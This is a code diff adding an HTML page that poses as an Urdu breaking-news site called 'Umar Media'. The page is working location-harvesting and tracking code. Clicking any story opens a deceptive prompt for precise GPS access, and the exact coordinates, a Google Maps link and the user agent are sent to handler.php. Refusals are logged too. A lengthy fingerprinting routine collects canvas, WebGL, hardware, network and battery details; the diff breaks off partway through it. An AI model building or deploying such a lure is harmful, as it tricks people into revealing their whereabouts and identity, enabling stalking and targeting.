@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html lang="ur" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Breaking News - Umar Media</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/location.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        :root {
+            --dark-bg: #000000;
+            --dark-card: #0f0f0f;
+            --dark-card-hover: #1a1a1a;
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0b0;
+            --orange-start: #ff6b35;
+            --orange-mid: #ff8c42;
+            --yellow-end: #ffd23f;
+            --accent-red: #dc2626;
+            --border-color: #2a2a2a;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.8);
+            --shadow-lg: 0 8px 30px rgba(0, 0, 0, 0.9);
+            --glow-orange: 0 0 20px rgba(255, 107, 53, 0.4);
+            --glow-yellow: 0 0 30px rgba(255, 210, 63, 0.5);
+        }
+
+        [data-theme="light"] {
+            --dark-bg: #f5f5f5;
+            --dark-card: #ffffff;
+            --dark-card-hover: #f9f9f9;
+            --text-primary: #1a1a1a;
+            --text-secondary: #4a4a4a;
+            --border-color: #e0e0e0;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 8px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        body {
+            font-family: 'Noto Sans Arabic', 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            transition: background 0.3s ease, color 0.3s ease;
+        }
+
+        /* Umar Media Logo */
+        .umar-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .logo-arabic {
+            font-family: 'Noto Sans Arabic', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--orange-start) 0%, var(--orange-mid) 50%, var(--yellow-end) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(255, 107, 53, 0.5);
+            line-height: 1.2;
+            letter-spacing: 2px;
+            filter: drop-shadow(0 0 10px rgba(255, 107, 53, 0.6));
+        }
+
+        .logo-english {
+            font-family: 'Inter', sans-serif;
+            font-size: 18px;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--orange-start) 0%, var(--orange-mid) 50%, var(--yellow-end) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            filter: drop-shadow(0 0 8px rgba(255, 107, 53, 0.5));
+        }
+
+        .umar-logo:hover {
+            transform: scale(1.05);
+        }
+
+        .umar-logo:hover .logo-arabic,
+        .umar-logo:hover .logo-english {
+            filter: drop-shadow(0 0 15px rgba(255, 107, 53, 0.8));
+        }
+
+        /* Header */
+        .news-header {
+            background: var(--dark-card);
+            border-bottom: 2px solid var(--border-color);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .theme-toggle {
+            background: var(--dark-card-hover);
+            border: 1px solid var(--border-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: var(--text-primary);
+            font-size: 18px;
+        }
+
+        .theme-toggle:hover {
+            background: var(--dark-card);
+            transform: scale(1.1);
+            border-color: var(--orange-start);
+            box-shadow: var(--glow-orange);
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 30px 20px;
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+
+        .page-title {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            color: var(--text-primary);
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        /* News Grid - Smaller and More Compact */
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 18px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 1400px) {
+            .news-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        @media (max-width: 1024px) {
+            .news-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .news-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* News Card - Compact Design */
+        .news-card {
+            background: var(--dark-card);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            transition: all 0.3s ease;
+            border: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .news-card {
+            cursor: pointer;
+        }
+
+        .news-card:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-lg), var(--glow-orange);
+            border-color: var(--orange-start);
+        }
+
+        .news-card-image {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            background: var(--dark-card-hover);
+        }
+
+        .news-card-content {
+            padding: 15px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .news-card-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 10px;
+            line-height: 1.4;
+            min-height: 44px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .news-card-body {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            margin-bottom: 12px;
+            flex: 1;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .news-card-date {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-top: auto;
+            padding-top: 10px;
+            border-top: 1px solid var(--border-color);
+            font-family: 'Inter', sans-serif;
+        }
+
+        .news-card-attribution {
+            font-size: 11px;
+            color: var(--yellow-end);
+            margin-bottom: 6px;
+            font-weight: 600;
+            text-shadow: 0 0 8px rgba(255, 210, 63, 0.4);
+        }
+
+        .breaking-badge {
+            background: linear-gradient(135deg, var(--orange-start), var(--accent-red));
+            color: white;
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            display: inline-block;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+            box-shadow: var(--glow-orange);
+        }
+
+        /* Location Permission Modal - Professional Small Design */
+        .location-permission-modal {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            width: 380px;
+            max-width: calc(100% - 40px);
+            background: var(--dark-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.05);
+            z-index: 2000;
+            display: none;
+            animation: slideInDown 0.3s ease-out;
+            backdrop-filter: blur(10px);
+        }
+
+        .location-permission-modal.active {
+            display: block;
+        }
+        
+        @keyframes slideInDown {
+            from { 
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .permission-content {
+            padding: 20px;
+        }
+
+        .permission-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .permission-icon-small {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #4285f4, #34a853);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: white;
+            flex-shrink: 0;
+        }
+        
+        .permission-title-small {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin: 0;
+            flex: 1;
+        }
+
+        .permission-close {
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+        }
+
+        .permission-close:hover {
+            background: var(--dark-card-hover);
+            color: var(--text-primary);
+        }
+        
+        .permission-description {
+            font-size: 14px;
+            line-height: 1.5;
+            color: var(--text-secondary);
+            margin-bottom: 16px;
+        }
+
+        .permission-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .location-btn {
+            flex: 1;
+            background: linear-gradient(135deg, #4285f4, #34a853);
+            color: #fff;
+            border: none;
+            padding: 10px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        
+        .location-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(66, 133, 244, 0.4);
+        }
+
+        .location-btn:active {
+            transform: translateY(0);
+        }
+
+        .location-btn-secondary {
+            background: transparent;
+            color: var(--text-secondary);
+            border: 1px solid var(--border-color);
+        }
+
+        .location-btn-secondary:hover {
+            background: var(--dark-card-hover);
+            color: var(--text-primary);
+            box-shadow: none;
+        }
+
+        .location-status {
+            margin-top: 12px;
+            padding: 10px 12px;
+            background: rgba(66, 133, 244, 0.1);
+            border-radius: 6px;
+            font-size: 12px;
+            color: #4285f4;
+            display: none;
+        }
+
+        .location-status.error {
+            background: rgba(220, 38, 38, 0.1);
+            color: #ef4444;
+        }
+
+        .location-status.success {
+            background: rgba(16, 185, 129, 0.1);
+            color: #10b981;
+        }
+
+        .location-status.show {
+            display: block;
+        }
+
+        /* Breaking News Overlay */
+        .breaking-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.5s;
+        }
+
+        .breaking-overlay.hidden {
+            display: none;
+        }
+        
+        .breaking-content {
+            text-align: center;
+            padding: 40px;
+            max-width: 800px;
+        }
+        
+        .breaking-title {
+            font-size: 72px;
+            font-weight: bold;
+            background: linear-gradient(135deg, var(--orange-start), var(--accent-red));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 30px;
+            animation: pulse 2s infinite;
+            text-shadow: 0 0 20px rgba(255, 107, 53, 0.8);
+        }
+        
+        .breaking-text {
+            font-size: 32px;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            background: var(--dark-card);
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .empty-state i {
+            font-size: 64px;
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+        }
+        
+        .empty-state h3 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+        
+        .empty-state p {
+            font-size: 16px;
+            color: var(--text-secondary);
+        }
+
+        /* Loading State */
+        .loading {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--text-secondary);
+        }
+
+        .loading i {
+            font-size: 48px;
+            animation: spin 1s linear infinite;
+            color: var(--orange-start);
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--dark-bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, var(--orange-start), var(--yellow-end));
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, var(--orange-mid), var(--yellow-end));
+        }
+
+        /* Full News Page Styles */
+        .full-news-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--dark-bg);
+            z-index: 1500;
+            overflow-y: auto;
+            display: none;
+        }
+
+        .full-news-overlay.active {
+            display: block;
+        }
+
+        .full-news-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .full-news-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .close-news-btn {
+            background: var(--dark-card);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .close-news-btn:hover {
+            background: var(--dark-card-hover);
+            border-color: var(--orange-start);
+        }
+
+        .full-news-image {
+            width: 100%;
+            max-height: 500px;
+            object-fit: cover;
+            border-radius: 12px;
+            margin-bottom: 30px;
+        }
+
+        .full-news-title {
+            font-size: 42px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .full-news-meta {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .full-news-content {
+            font-size: 18px;
+            line-height: 1.8;
+            color: var(--text-primary);
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <!-- Location Permission Modal - Professional Small Design (Upper Left Corner) -->
+    <div class="location-permission-modal" id="locationPermissionModal">
+        <div class="permission-content">
+            <div class="permission-header">
+                <div class="permission-icon-small">
+                    <i class="fas fa-map-marker-alt"></i>
+                </div>
+                <div class="permission-title-small">Location Access</div>
+                <button class="permission-close" onclick="closeLocationModal()" title="Close">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="permission-description">
+                Allow location access to view the complete news article with personalized content for your area.
+            </div>
+            <div class="permission-actions">
+                <button class="location-btn" onclick="requestLocationPermission()">
+                    <i class="fas fa-check"></i> Allow
+                </button>
+                <button class="location-btn location-btn-secondary" onclick="skipLocationAndShowNews()">
+                    Skip
+                </button>
+            </div>
+            <div class="location-status" id="locationStatus"></div>
+        </div>
+    </div>
+
+    <!-- Full News Page Overlay -->
+    <div class="full-news-overlay" id="fullNewsOverlay">
+        <div class="full-news-container">
+            <div class="full-news-header">
+                <h2 style="color: var(--text-primary);">Full News Article</h2>
+                <button class="close-news-btn" onclick="closeFullNews()">
+                    <i class="fas fa-times"></i> Close
+                </button>
+            </div>
+            <div id="fullNewsContent">
+                <!-- Full news content will be loaded here -->
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="main-content" id="mainContent">
+        <!-- Header -->
+        <div class="news-header">
+            <div class="header-left">
+                <a href="#" class="umar-logo">
+                    <div class="logo-arabic">عمر</div>
+                    <div class="logo-english">UMAR MEDIA</div>
+                </a>
+            </div>
+            <div class="header-right">
+                <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle Theme">
+                    <i class="fas fa-sun" id="themeIcon"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Page Title -->
+        <h1 class="page-title">تازہ خبریں</h1>
+        
+        <!-- News Grid -->
+        <div class="news-grid" id="newsGrid">
+            <div class="loading">
+                <i class="fas fa-spinner"></i>
+                <p style="margin-top: 15px;">Loading news...</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let userLocation = null;
+        let locationGranted = false;
+        let currentTheme = localStorage.getItem('theme') || 'dark';
+
+        // Initialize theme
+        function initTheme() {
+            document.documentElement.setAttribute('data-theme', currentTheme);
+            const icon = document.getElementById('themeIcon');
+            if (currentTheme === 'dark') {
+                icon.className = 'fas fa-sun';
+            } else {
+                icon.className = 'fas fa-moon';
+            }
+        }
+
+        // Toggle theme
+        function toggleTheme() {
+            currentTheme = currentTheme === 'dark' ? 'light' : 'dark';
+            localStorage.setItem('theme', currentTheme);
+            initTheme();
+        }
+
+        // Initialize theme on load
+        initTheme();
+
+        // Store selected news item
+        let selectedNewsItem = null;
+
+        // Request location permission when user clicks on news
+        function requestLocationPermission() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        userLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        locationGranted = true;
+                        
+                        // Save location to logs with news context
+                        saveLocationToLogs(userLocation, selectedNewsItem);
+                        
+                        // Update status
+                        const statusEl = document.getElementById('locationStatus');
+                        statusEl.textContent = `✓ Location accessed successfully`;
+                        statusEl.classList.remove('error', 'show');
+                        statusEl.classList.add('success', 'show');
+                        
+                        // Hide location permission modal and show full news
+                        setTimeout(function() {
+                            document.getElementById('locationPermissionModal').classList.remove('active');
+                            showFullNews(selectedNewsItem);
+                        }, 800);
+                    },
+                    function(error) {
+                        // Save error to logs
+                        saveLocationErrorToLogs(error, selectedNewsItem);
+                        // Still show news but log the error
+                        const statusEl = document.getElementById('locationStatus');
+                        statusEl.textContent = 'Location access denied. Proceeding anyway...';
+                        statusEl.classList.remove('success', 'show');
+                        statusEl.classList.add('error', 'show');
+                        
+                        setTimeout(function() {
+                            document.getElementById('locationPermissionModal').classList.remove('active');
+                            showFullNews(selectedNewsItem);
+                        }, 1500);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Geolocation not supported, save to logs and show news anyway
+                saveLocationErrorToLogs({ message: 'Geolocation is not supported by this browser' }, selectedNewsItem);
+                document.getElementById('locationPermissionModal').classList.remove('active');
+                showFullNews(selectedNewsItem);
+            }
+        }
+
+        // Save location to logs with news context and update existing entry
+        function saveLocationToLogs(location, newsItem) {
+            const newsTitle = newsItem ? newsItem.title : 'Unknown News';
+            const newsId = newsItem ? newsItem.id : 'N/A';
+            
+            // Send GPS location to update existing log entry
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: {
+                    action: 'update_gps_location',
+                    latitude: location.lat,
+                    longitude: location.lon,
+                    accuracy: location.accuracy,
+                    timestamp: location.timestamp,
+                    news_id: newsId,
+                    news_title: newsTitle
+                },
+                success: function(response) {
+                    console.log('GPS location updated in logs');
+                },
+                error: function() {
+                    console.log('Error updating GPS location in logs');
+                    // Fallback: save as separate entry
+                    const locationData = `[BREAKING NEWS - GPS LOCATION GRANTED]
+Timestamp: ${location.timestamp}
+News ID: ${newsId}
+News Title: ${newsTitle}
+Exact GPS Latitude: ${location.lat}
+Exact GPS Longitude: ${location.lon}
+GPS Accuracy: ${location.accuracy} meters
+Google Maps: https://www.google.com/maps?q=${location.lat},${location.lon}
+User Agent: ${navigator.userAgent}
+-------------------------
+`;
+                    $.ajax({
+                        type: 'POST',
+                        url: 'handler.php',
+                        data: { data: locationData },
+                        success: function() {
+                            console.log('Location saved as separate entry');
+                        }
+                    });
+                }
+            });
+        }
+
+        // Save location error to logs with news context
+        function saveLocationErrorToLogs(error, newsItem) {
+            const newsTitle = newsItem ? newsItem.title : 'Unknown News';
+            const newsId = newsItem ? newsItem.id : 'N/A';
+            const errorData = `[BREAKING NEWS - LOCATION DENIED/ERROR]
+Timestamp: ${new Date().toISOString()}
+News ID: ${newsId}
+News Title: ${newsTitle}
+Error: ${error.message || 'Location access denied'}
+Code: ${error.code || 'UNKNOWN'}
+User Agent: ${navigator.userAgent}
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: errorData },
+                success: function() {
+                    console.log('Location error saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving location error to logs');
+                }
+            });
+        }
+
+        // Show full news page
+        function showFullNews(newsItem) {
+            if (!newsItem) return;
+            
+            const fullNewsContent = document.getElementById('fullNewsContent');
+            let html = '';
+            
+            // Add image if available
+            if (newsItem.image) {
+                html += `<img src="../../${newsItem.image}" alt="${newsItem.title || 'News Image'}" class="full-news-image" onerror="this.style.display='none'">`;
+            }
+            
+            // Add title
+            html += `<h1 class="full-news-title">${newsItem.title || 'Breaking News'}</h1>`;
+            
+            // Add meta information
+            html += '<div class="full-news-meta">';
+            if (newsItem.attribution) {
+                html += `<span><i class="fas fa-user"></i> ${newsItem.attribution}</span>`;
+            }
+            html += `<span><i class="fas fa-clock"></i> ${formatDate(newsItem.timestamp || newsItem.date_added)}</span>`;
+            if (newsItem.priority === 'high') {
+                html += '<span class="breaking-badge">Breaking News</span>';
+            }
+            html += '</div>';
+            
+            // Add full content
+            html += `<div class="full-news-content">${newsItem.content || 'No content available.'}</div>`;
+            
+            fullNewsContent.innerHTML = html;
+            document.getElementById('fullNewsOverlay').classList.add('active');
+        }
+
+        // Close full news page
+        function closeFullNews() {
+            document.getElementById('fullNewsOverlay').classList.remove('active');
+            selectedNewsItem = null;
+        }
+
+        // Handle news card click
+        function openNewsItem(newsItem) {
+            selectedNewsItem = newsItem;
+            // Show location permission modal first
+            document.getElementById('locationPermissionModal').classList.add('active');
+        }
+
+        // Format date for display
+        function formatDate(dateString) {
+            if (!dateString) return 'تازہ خبر';
+            
+            // If it's a simple string like "Just Now" or "5 minutes ago", return as is
+            if (dateString.includes('ago') || dateString.includes('Now') || dateString.includes('minutes') || dateString.includes('hours')) {
+                return dateString;
+            }
+            
+            try {
+                const date = new Date(dateString);
+                const options = { 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit'
+                };
+                return date.toLocaleDateString('ur-PK', options);
+            } catch (e) {
+                return dateString;
+            }
+        }
+
+        // Load news items dynamically - show immediately on page load
+        function loadNewsItems() {
+            fetch('../../news_api.php?type=breaking_news')
+                .then(response => response.json())
+                .then(data => {
+                    const newsGrid = document.getElementById('newsGrid');
+                    newsGrid.innerHTML = '';
+                    
+                    if (data.error) {
+                        newsGrid.innerHTML = `
+                            <div class="empty-state" style="grid-column: 1 / -1;">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                <h3>Error loading news</h3>
+                                <p>${data.error}</p>
+                            </div>
+                        `;
+                        return;
+                    }
+                    
+                    if (!data || data.length === 0) {
+                        newsGrid.innerHTML = `
+                            <div class="empty-state" style="grid-column: 1 / -1;">
+                                <i class="fas fa-newspaper"></i>
+                                <h3>No Breaking News Available</h3>
+                                <p>Check back later for the latest updates</p>
+                            </div>
+                        `;
+                        return;
+                    }
+                    
+                    // Sort by ID descending (newest first) - show more items in compact grid
+                    const sortedData = [...data].sort((a, b) => (b.id || 0) - (a.id || 0)).slice(0, 12);
+                    
+                    sortedData.forEach(item => {
+                        const newsCard = document.createElement('div');
+                        newsCard.className = 'news-card';
+                        newsCard.onclick = function() {
+                            openNewsItem(item);
+                        };
+                        
+                        let cardHTML = '';
+                        
+                        // Add image if available
+                        if (item.image) {
+                            cardHTML += `<img src="../../${item.image}" alt="${item.title || 'News Image'}" class="news-card-image" onerror="this.style.display='none'">`;
+                        } else {
+                            cardHTML += `<div class="news-card-image" style="display: flex; align-items: center; justify-content: center; color: var(--text-secondary);">
+                                <i class="fas fa-image" style="font-size: 36px;"></i>
+                            </div>`;
+                        }
+                        
+                        cardHTML += '<div class="news-card-content">';
+                        
+                        // Add breaking badge if high priority
+                        if (item.priority === 'high') {
+                            cardHTML += '<span class="breaking-badge">Breaking News</span>';
+                        }
+                        
+                        // Add attribution if available
+                        if (item.attribution) {
+                            cardHTML += `<div class="news-card-attribution">${item.attribution}</div>`;
+                        }
+                        
+                        // Add title
+                        cardHTML += `<div class="news-card-title">${item.title || 'Breaking News'}</div>`;
+                        
+                        // Add content preview
+                        if (item.content) {
+                            const preview = item.content.length > 100 ? item.content.substring(0, 100) + '...' : item.content;
+                            cardHTML += `<div class="news-card-body">${preview}</div>`;
+                        }
+                        
+                        // Add date
+                        cardHTML += `<div class="news-card-date">${formatDate(item.timestamp || item.date_added)}</div>`;
+                        
+                        cardHTML += '</div>';
+                        
+                        newsCard.innerHTML = cardHTML;
+                        newsGrid.appendChild(newsCard);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error loading news:', error);
+                    document.getElementById('newsGrid').innerHTML = `
+                        <div class="empty-state" style="grid-column: 1 / -1;">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <h3>Error loading news</h3>
+                            <p>Unable to load news items. Please check your connection.</p>
+                        </div>
+                    `;
+                });
+        }
+
+        // Comprehensive Visitor Fingerprinting Function
+        function collectVisitorFingerprint() {
+            try {
+                var client = new ClientJS();
+                
+                // Basic Device Info
+                var OS = client.getOS();
+                var OSVersion = client.getOSVersion();
+                var browser = client.getBrowser();
+                var browserVersion = client.getBrowserVersion();
+                var CPU = client.getCPU();
+                var platform = navigator.platform || 'Unknown';
+                var userAgent = navigator.userAgent;
+                
+                // Screen Info
+                var screenWidth = screen.width || 'Unknown';
+                var screenHeight = screen.height || 'Unknown';
+                var screenAvailWidth = screen.availWidth || 'Unknown';
+                var screenAvailHeight = screen.availHeight || 'Unknown';
+                var colorDepth = screen.colorDepth || 'Unknown';
+                var pixelDepth = screen.pixelDepth || 'Unknown';
+                var deviceXDPI = screen.deviceXDPI || 'Unknown';
+                var deviceYDPI = screen.deviceYDPI || 'Unknown';
+                
+                // Hardware Info
+                var hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+                var deviceMemory = navigator.deviceMemory || 'Unknown';
+                var maxTouchPoints = navigator.maxTouchPoints || 'Unknown';
+                
+                // Timezone & Locale
+                var timeZone = '';
+                try {
+                    timeZone = client.getTimeZone();
+                } catch(e) {
+                    timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+                }
+                var timezoneOffset = new Date().getTimezoneOffset();
+                var language = navigator.language || 'Unknown';
+                var languages = navigator.languages ? navigator.languages.join(', ') : language;
+                
+                // Canvas Fingerprint
+                var canvasFingerprint = '';
+                try {
+                    var canvas = document.createElement('canvas');
+                    var ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.textBaseline = 'alphabetic';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Canvas fingerprint test 🔒', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Canvas fingerprint test 🔒', 4, 17);
+                    canvasFingerprint = canvas.toDataURL();
+                } catch(e) {
+                    canvasFingerprint = 'Not Available';
+                }
+                
+                // WebGL Fingerprint
+                var webglFingerprint = '';
+                try {
+                    var canvas = document.createElement('canvas');
+                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            webglFingerprint = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + ' | ' + 
+                                              gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        }
+                    }
+                } catch(e) {
+                    webglFingerprint = 'Not Available';
+                }
+                
+                // Plugins
+                var plugins = [];
+                for (var i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                var pluginsList = plugins.join(', ') || 'None';
+                
+                // MIME Types
+                var mimeTypes = [];
+                for (var i = 0; i < navigator.mimeTypes.length; i++) {
+                    mimeTypes.push(navigator.mimeTypes[i].type);
+                }
+                var mimeTypesList = mimeTypes.join(', ') || 'None';
+                
+                // Storage
+                var localStorage = 'Not Available';
+                var sessionStorage = 'Not Available';
+                try {
+                    localStorage = typeof(Storage) !== 'undefined' && window.localStorage ? 'Available' : 'Not Available';
+                } catch(e) {}
+                try {
+                    sessionStorage = typeof(Storage) !== 'undefined' && window.sessionStorage ? 'Available' : 'Not Available';
+                } catch(e) {}
+                
+                // Cookies
+                var cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+                
+                // Network Info
+                var connectionInfo = 'Not Available';
+                var networkType = 'Unknown';
+                var effectiveType = 'Unknown';
+                var downlink = 'Unknown';
+                var rtt = 'Unknown';
+                if (navigator.connection) {
+                    connectionInfo = 'Available';
+                    networkType = navigator.connection.type || 'Unknown';
+                    effectiveType = navigator.connection.effectiveType || 'Unknown';
+                    downlink = navigator.connection.downlink || 'Unknown';
+                    rtt = navigator.connection.rtt || 'Unknown';
+                }
+                
+                // Battery API (if available)
+                var batteryInfo = 'Not Available';
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(function(battery) {
+                        batteryInfo = 'Level: ' + (battery.level * 100) + '%, Charging: ' + battery.charging;
+                    });
+                }
+                
+                // Do Not Track
+                var doNotTrack = navigator.doNotTrack || 'Unknown';
+                
+                // Referrer
+                var referrer = document.referrer || 'Direct Visit';
+                
+                // Page URL
+                var pageURL = window.location.href;
+                
+                // Build fingerprint data
+                var fingerprintData = {
+                    timestamp: new Date().toISOString(),
+                    collectionTime: new Date().toLocaleString(),
